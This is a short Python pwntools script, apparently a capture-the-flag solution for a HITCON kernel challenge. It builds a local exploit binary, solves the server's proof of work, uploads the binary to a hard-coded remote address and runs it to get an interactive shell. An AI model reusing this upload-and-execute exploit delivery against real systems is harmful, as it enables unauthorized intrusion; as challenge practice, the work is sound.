#!/usr/bin/env python3
from pwn import *


def main():
    subprocess.check_call(['make', 'pwnit'])
    with open('pwnit', 'rb') as fp:
        pwnit = fp.read()
    with remote('13.231.7.116', 9427) as tube:
        assert tube.recvline() == b'Proof of Work - Give me the token of:\n'
        args = tube.recvline().split()
        assert args[0] == b'hashcash'
        token = subprocess.check_output(args).strip()
        tube.sendline(token)
        tube.recvuntil(b'File size in bytes? (MAX: 2M)\n')
        tube.sendline(str(len(pwnit)))
        tube.recvuntil(b'Reading 40136 bytes..\n')
        tube.send(pwnit)
        tube.recvuntil(b'~ $ ')
        tube.sendline(b'/home/atoms/exp')
        tube.interactive()  # hitcon{kerneldeadlockDoooS}


if __name__ == '__main__':
    main()
